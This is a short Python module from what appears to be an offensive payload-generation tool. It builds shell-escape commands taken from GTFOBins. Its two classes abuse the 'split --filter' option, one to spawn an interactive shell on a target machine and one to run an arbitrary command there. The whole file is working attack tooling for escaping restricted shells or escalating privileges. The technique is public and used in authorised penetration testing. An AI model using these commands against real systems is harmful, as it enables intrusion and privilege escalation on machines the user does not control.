from ogabog.cores import plugin, const


class Shell(plugin.BaseShell):
    def __init__(self):
        super().__init__()
        # self.shell_type = 0
        self.is_interactive = True
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "https://gtfobins.github.io/gtfobins/split/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = f"split --filter={self.args.shell} /dev/stdin"


class Command(plugin.BaseShell):
    def __init__(self):
        super().__init__()
        # self.shell_type = 3
        self.is_interactive = False
        self.add_args(
            "--command",
            default="/usr/bin/id",
            help="Command to run on target machine"
        )
        self.opts.description = "https://gtfobins.github.io/gtfobins/split/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = f"echo | split --filter={self.args.command} /dev/stdin"
